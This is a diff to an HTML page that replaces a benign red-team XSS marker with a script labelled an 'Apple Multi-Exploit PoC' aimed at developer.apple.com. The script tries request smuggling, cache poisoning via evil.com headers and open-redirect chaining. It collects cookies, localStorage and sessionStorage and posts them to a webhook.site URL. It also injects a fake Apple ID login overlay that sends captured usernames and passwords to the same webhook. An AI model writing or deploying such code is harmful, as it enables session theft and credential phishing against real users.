@@ -1,14 +1,116 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>RedTeam Marker</title>
+<title>Apple Multi-Exploit PoC</title>
 </head>
-<body style="background-color:#fff; text-align:center; padding-top:50px;">
-<h1 style="color:red; font-size:50px;">[MARKER RED - SUCCESS]</h1>
+<body>
+<h1>Loading Exploit...</h1>
 <script>
-    alert('REDTEAM_XSS_MARKER');
-    document.body.insertAdjacentHTML('beforeend', '<p>Proof of Concept Executed</p>');
+(async () => {
+  const webhook = "https://webhook.site/6779eec5-8f34-4065-80c4-b471fe8c032b"; // Webhook المباشر
+  const targetHost = "developer.apple.com";
+  const vulnerableEndpoint = `https://${targetHost}/search/services/v1/quick-links/`;
+  const sensitivePath = "/account/settings";
+
+  // إرسال أي بيانات إلى Webhook
+  async function send(label, data) {
+    try {
+      await fetch(webhook, {
+        method: "POST",
+        body: JSON.stringify({ label, data, time: new Date().toISOString() }),
+        headers: { "Content-Type": "application/json" }
+      });
+      console.log(`[+] Sent ${label} to webhook`);
+    } catch(e) {
+      console.error(`[-] Failed to send ${label}`, e);
+    }
+  }
+
+  // 1️⃣ Client-Side Desync (CSD)
+  try {
+    console.log("[*] Trying Client-Side Desync...");
+    await fetch(vulnerableEndpoint, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Connection": "keep-alive"
+      },
+      body: `payload=${encodeURIComponent(`
+        GET ${sensitivePath} HTTP/1.1
+        Host: ${targetHost}
+
+      `)}`
+    });
+    await send("CSD_Attempt", { endpoint: vulnerableEndpoint, path: sensitivePath });
+  } catch(e) {}
+
+  // 2️⃣ Cache Poisoning Attempt
+  try {
+    console.log("[*] Trying Cache Poisoning...");
+    await fetch(`https://${targetHost}/`, {
+      method: "GET",
+      headers: {
+        "X-Forwarded-Host": "evil.com/marker",
+        "X-Original-URL": "evil.com/marker"
+      }
+    });
+    await send("Cache_Poisoning_Attempt", { marker: "evil.com/marker" });
+  } catch(e) {}
+
+  // 3️⃣ Open Redirect Chaining Attempt
+  try {
+    console.log("[*] Trying Open Redirect chaining...");
+    const redirectPayload = `https://${targetHost}/redirect?next=https://evil.com/phish`;
+    await fetch(redirectPayload, { method: "GET", redirect: "follow" });
+    await send("Open_Redirect_Attempt", { redirectPayload });
+  } catch(e) {}
+
+  // 4️⃣ Collect Session Data
+  try {
+    console.log("[*] Collecting session data...");
+    const stolen = {
+      cookies: document.cookie,
+      localStorage: JSON.stringify(localStorage),
+      sessionStorage: JSON.stringify(sessionStorage),
+      location: location.href,
+      userAgent: navigator.userAgent
+    };
+    await send("Session_Data", stolen);
+  } catch(e) {}
+
+  // 5️⃣ Fake Login Overlay Injection
+  try {
+    console.log("[*] Injecting fake login overlay...");
+    const overlay = document.createElement("div");
+    overlay.style = `
+      position:fixed;top:0;left:0;width:100%;height:100%;
+      background:rgba(255,255,255,0.97);z-index:999999;
+      display:flex;justify-content:center;align-items:center;
+      font-family:sans-serif;
+    `;
+    overlay.innerHTML = `
+      <div style="background:white;padding:20px;border-radius:8px;box-shadow:0 0 20px rgba(0,0,0,0.3)">
+        <h2>Apple ID Login</h2>
+        <input id="phishUser" type="text" placeholder="Apple ID" style="display:block;margin:10px 0;padding:5px;width:250px">
+        <input id="phishPass" type="password" placeholder="Password" style="display:block;margin:10px 0;padding:5px;width:250px">
+        <button id="phishBtn" style="padding:8px 20px">Sign In</button>
+      </div>
+    `;
+    document.body.appendChild(overlay);
+
+    document.getElementById("phishBtn").onclick = async () => {
+      const creds = {
+        username: document.getElementById("phishUser").value,
+        password: document.getElementById("phishPass").value
+      };
+      await send("Phished_Credentials", creds);
+      alert("Login failed. Please try again.");
+      overlay.remove();
+    };
+  } catch(e) {}
+
+})();
 </script>
 </body>
 </html>
